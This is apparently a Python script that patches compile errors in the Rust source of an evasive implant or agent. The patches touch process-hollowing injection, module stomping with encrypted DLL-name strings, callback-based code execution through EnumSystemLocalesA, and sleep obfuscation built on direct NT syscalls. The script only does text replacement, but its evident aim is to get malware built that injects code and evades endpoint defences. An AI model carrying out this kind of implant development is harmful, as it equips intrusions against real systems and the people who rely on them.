import re
import os

# fix process hollowing args back to u32
with open("hollowing/src/windows_impl.rs", "r") as f:
    text = f.read()

text = text.replace("pub fn inject_into_process(process: *mut c_void, payload: &[u8]) -> Result<()> { Ok(()) }", 
                    "pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> { Ok(()) }")
                    
with open("hollowing/src/windows_impl.rs", "w") as f:
    f.write(text)

# fix the macro arrays
with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()
    
# Put back the original code with let bindings
text = text.replace('''            let candidates = [
                enc_str!("msfte.dll"),
                enc_str!("msratelc.dll"),
                enc_str!("scrobj.dll"),
                enc_str!("amstream.dll")
            ];''', '''            // Just bypass the strings being dropped issue entirely by allocating them as standard Rust strings immediately after decode
            let dll1 = enc_str!("msfte.dll");
            let dll2 = enc_str!("msratelc.dll");
            let dll3 = enc_str!("scrobj.dll");
            let dll4 = enc_str!("amstream.dll");
            
            // And use a vector instead of a fixed size array which requires same length types from the macro returned byte arrays
            let candidates: Vec<&[u8]> = vec![
                dll1.as_ref(),
                dll2.as_ref(),
                dll3.as_ref(),
                dll4.as_ref()
            ];''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)
    
with open("agent/src/callback_exec.rs", "r") as f:
    text = f.read()

text = text.replace("use winapi::um::winnls::{EnumSystemLocalesA, LCID};", 
                    "use winapi::um::winnls::EnumSystemLocalesA;\nuse winapi::um::winnt::LCID;")

with open("agent/src/callback_exec.rs", "w") as f:
    f.write(text)

with open("agent/src/obfuscated_sleep.rs", "r") as f:
    text = f.read()

text = text.replace("crate::syscalls::syscall_NtProtectVirtualMemory", "syscalls::syscall_NtProtectVirtualMemory")
text = text.replace("crate::syscalls::syscall_NtCancelIoFileEx", "syscalls::syscall_NtCancelIoFileEx")
text = text.replace("crate::syscalls::syscall_NtWaitForSingleObject", "syscalls::syscall_NtWaitForSingleObject")
text = text.replace("crate::syscalls::syscall_NtCreateTimer", "syscalls::syscall_NtCreateTimer")
text = text.replace("crate::syscalls::syscall_NtSetTimer", "syscalls::syscall_NtSetTimer")
text = text.replace("crate::syscalls::syscall_NtCreateEvent", "syscalls::syscall_NtCreateEvent")

with open("agent/src/obfuscated_sleep.rs", "w") as f:
    f.write(text)
